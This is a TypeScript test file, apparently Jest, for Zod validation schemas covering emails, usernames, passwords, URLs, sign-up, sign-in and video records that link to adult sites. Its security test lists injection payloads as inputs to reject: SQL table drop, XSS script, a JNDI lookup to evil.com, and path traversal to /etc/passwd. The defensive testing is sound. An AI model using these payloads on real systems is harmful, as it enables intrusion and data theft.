import {
  emailSchema,
  usernameSchema,
  passwordSchema,
  urlSchema,
  signUpSchema,
  signInSchema,
  createVideoSchema,
  updateVideoSchema
} from '../../../src/lib/validation'
import { ZodError } from 'zod'

describe('Validation Schemas', () => {
  describe('emailSchema', () => {
    it('should validate correct email addresses', () => {
      const validEmails = [
        'test@example.com',
        'user.name@domain.co.uk',
        'user+tag@example.org',
        'email@subdomain.example.com'
      ]

      validEmails.forEach(email => {
        expect(() => emailSchema.parse(email)).not.toThrow()
      })
    })

    it('should reject invalid email addresses', () => {
      const invalidEmails = [
        'notanemail',
        '@example.com',
        'user@',
        'user name@example.com',
        'user@example',
        ''
      ]

      invalidEmails.forEach(email => {
        expect(() => emailSchema.parse(email)).toThrow(ZodError)
      })
    })
  })

  describe('usernameSchema', () => {
    it('should validate correct usernames', () => {
      const validUsernames = [
        'user123',
        'test_user',
        'UserName',
        'aaa', // minimum length (3 characters)
        'a'.repeat(30) // maximum length
      ]

      validUsernames.forEach(username => {
        expect(() => usernameSchema.parse(username)).not.toThrow()
      })
    })

    it('should reject invalid usernames', () => {
      const invalidUsernames = [
        'ab', // too short
        'a'.repeat(31), // too long
        'user name', // spaces
        'user@name', // special characters
        'user#name',
        'user-name', // dashes not allowed
        '',
        'user.name' // dots not allowed
      ]

      invalidUsernames.forEach(username => {
        expect(() => usernameSchema.parse(username)).toThrow(ZodError)
      })
    })
  })

  describe('passwordSchema', () => {
    it('should validate correct passwords', () => {
      const validPasswords = [
        'password123', // minimum length 6
        'a'.repeat(128), // maximum length
        'simplepass',
        'MyPassword123'
      ]

      validPasswords.forEach(password => {
        expect(() => passwordSchema.parse(password)).not.toThrow()
      })
    })

    it('should reject invalid passwords', () => {
      const invalidPasswords = [
        'short', // too short (less than 6)
        'a'.repeat(129), // too long (more than 128)
        ''
      ]

      invalidPasswords.forEach(password => {
        expect(() => passwordSchema.parse(password)).toThrow(ZodError)
      })
    })
  })

  describe('urlSchema', () => {
    it('should validate correct URLs', () => {
      const validUrls = [
        'https://www.example.com',
        'http://test.com/path?query=value',
        'https://subdomain.example.org/path',
        'https://www.pornhub.com/view_video.php?viewkey=12345',
        'https://www.redgifs.com/watch/testvideoname'
      ]

      validUrls.forEach(url => {
        expect(() => urlSchema.parse(url)).not.toThrow()
      })
    })

    it('should reject invalid URLs', () => {
      const invalidUrls = [
        'not-a-url',
        '',
        'just-text',
        'http://',
        'https://'
      ]

      invalidUrls.forEach(url => {
        expect(() => urlSchema.parse(url)).toThrow(ZodError)
      })
    })
  })

  describe('signUpSchema', () => {
    it('should validate correct sign up data', () => {
      const validSignUpData = {
        email: 'test@example.com',
        username: 'testuser123',
        password: 'password123',
        confirmPassword: 'password123',
        firstName: 'John',
        lastName: 'Doe'
      }

      expect(() => signUpSchema.parse(validSignUpData)).not.toThrow()
    })

    it('should reject invalid sign up data', () => {
      const invalidSignUpData = [
        {
          email: 'invalid-email',
          username: 'testuser123',
          password: 'password123',
          confirmPassword: 'password123',
          firstName: 'John',
          lastName: 'Doe'
        },
        {
          email: 'test@example.com',
          username: 'ab', // too short
          password: 'password123',
          confirmPassword: 'password123',
          firstName: 'John',
          lastName: 'Doe'
        },
        {
          email: 'test@example.com',
          username: 'testuser123',
          password: 'short', // too short
          confirmPassword: 'short',
          firstName: 'John',
          lastName: 'Doe'
        },
        {
          email: 'test@example.com',
          username: 'testuser123',
          password: 'password123',
          confirmPassword: 'different', // passwords don't match
          firstName: 'John',
          lastName: 'Doe'
        }
      ]

      invalidSignUpData.forEach(data => {
        expect(() => signUpSchema.parse(data)).toThrow(ZodError)
      })
    })
  })

  describe('signInSchema', () => {
    it('should validate correct sign in data', () => {
      const validSignInData = {
        email: 'test@example.com',
        password: 'password123'
      }

      expect(() => signInSchema.parse(validSignInData)).not.toThrow()
    })

    it('should reject invalid sign in data', () => {
      const invalidSignInData = [
        {
          email: 'invalid-email',
          password: 'password123'
        },
        {
          email: 'test@example.com',
          password: '' // empty password
        },
        {
          // missing email
          password: 'password123'
        },
        {
          email: 'test@example.com'
          // missing password
        }
      ]

      invalidSignInData.forEach(data => {
        expect(() => signInSchema.parse(data)).toThrow(ZodError)
      })
    })
  })

  describe('createVideoSchema', () => {
    it('should validate correct video creation data', () => {
      const validVideoData = {
        title: 'Test Video',
        originalUrl: 'https://www.pornhub.com/view_video.php?viewkey=12345',
        description: 'Test description',
        tags: ['tag1', 'tag2']
      }

      expect(() => createVideoSchema.parse(validVideoData)).not.toThrow()
    })

    it('should validate video data without optional fields', () => {
      const minimalVideoData = {
        originalUrl: 'https://www.pornhub.com/view_video.php?viewkey=12345'
      }

      expect(() => createVideoSchema.parse(minimalVideoData)).not.toThrow()
    })

    it('should reject invalid video creation data', () => {
      const invalidVideoData = [
        {
          title: 'a'.repeat(201), // title too long
          originalUrl: 'https://www.pornhub.com/view_video.php?viewkey=12345'
        },
        {
          originalUrl: 'invalid-url' // invalid URL
        },
        {
          originalUrl: 'https://www.pornhub.com/view_video.php?viewkey=12345',
          description: 'a'.repeat(1001) // description too long
        }
      ]

      invalidVideoData.forEach(data => {
        expect(() => createVideoSchema.parse(data)).toThrow(ZodError)
      })
    })
  })

  describe('updateVideoSchema', () => {
    it('should validate correct video update data', () => {
      const validUpdateData = {
        title: 'Updated Title',
        description: 'Updated description',
        tags: ['newtag1', 'newtag2']
      }

      expect(() => updateVideoSchema.parse(validUpdateData)).not.toThrow()
    })

    it('should validate partial update data', () => {
      const partialUpdateData = {
        title: 'Just updating title'
      }

      expect(() => updateVideoSchema.parse(partialUpdateData)).not.toThrow()
    })

    it('should reject invalid update data', () => {
      const invalidUpdateData = [
        {
          title: 'a'.repeat(201) // title too long
        },
        {
          description: 'a'.repeat(1001) // description too long
        },
        {
          originalUrl: 'invalid-url' // invalid URL
        }
      ]

      invalidUpdateData.forEach(data => {
        expect(() => updateVideoSchema.parse(data)).toThrow(ZodError)
      })
    })
  })

  describe('Edge cases and security', () => {
    it('should handle very long strings gracefully', () => {
      const veryLongString = 'a'.repeat(10000)
      
      expect(() => usernameSchema.parse(veryLongString)).toThrow(ZodError)
      expect(() => passwordSchema.parse(veryLongString)).toThrow(ZodError)
    })

    it('should reject potential injection attempts', () => {
      const maliciousInputs = [
        "'; DROP TABLE users; --",
        '<script>alert("xss")</script>',
        '${jndi:ldap://evil.com/a}',
        '../../../etc/passwd'
      ]

      maliciousInputs.forEach(input => {
        expect(() => usernameSchema.parse(input)).toThrow(ZodError)
      })
    })

    it('should handle null and undefined values', () => {
      expect(() => emailSchema.parse(null)).toThrow(ZodError)
      expect(() => emailSchema.parse(undefined)).toThrow(ZodError)
      expect(() => usernameSchema.parse(null)).toThrow(ZodError)
      expect(() => passwordSchema.parse(undefined)).toThrow(ZodError)
    })
  })
})